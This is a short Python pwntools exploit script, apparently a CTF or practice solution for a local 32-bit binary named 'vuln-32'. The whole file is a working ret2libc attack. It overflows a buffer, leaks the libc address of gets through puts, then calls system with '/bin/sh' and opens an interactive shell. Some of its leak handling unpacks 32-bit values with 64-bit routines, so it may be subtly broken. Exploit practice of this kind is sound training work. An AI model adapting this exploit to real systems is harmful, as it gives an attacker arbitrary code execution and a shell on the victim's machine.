from pwn import *
import sys

binary = "./vuln-32"
elf = context.binary = ELF(binary)
libc = ELF("libc.so.6")

p = process(binary)

## 32 Bits no need any Gadgets 
#08049172 : Vuln

vuln = p32(0x08049172)

## Functions
gets = p32(elf.sym["got.gets"])
puts = p32(elf.sym["plt.puts"])

# print(hex(u64(gets.ljust(8,b"\x00"))))
# print(hex(u64(puts.ljust(8,b"\x00"))))

payload = b"A"*76
payload += puts
payload += vuln
payload += gets

p.recv()
p.sendline(payload)
# print(p.recvline()[:-1][:-8])
## Leak

leak = u64(p.recvline()[:-1][:-8].strip().ljust(8,b"\x00"))

libc.address = leak - libc.symbols['gets']
bin_sh = p32(next(libc.search(b"/bin/sh\x00")))
system = p32(libc.symbols.system)

# ## All addresses
log.info("Leak : " + hex(leak))
log.info("Libc Base : " + hex(libc.address))
log.info("str_bin_sh : " + hex(u64(bin_sh.ljust(8,b"\x00"))))
log.info("system : " + hex(u64(system.ljust(8,b"\x00"))))


#pause() #Debugging purpose, use x/s [address] to check if the leak is correct

## Attack payload
payload = b"A"*76
payload += system
payload += p32(0x90909090) #add 4 bytes for return to system.
payload += bin_sh


p.recv()
p.sendline(payload)
p.interactive()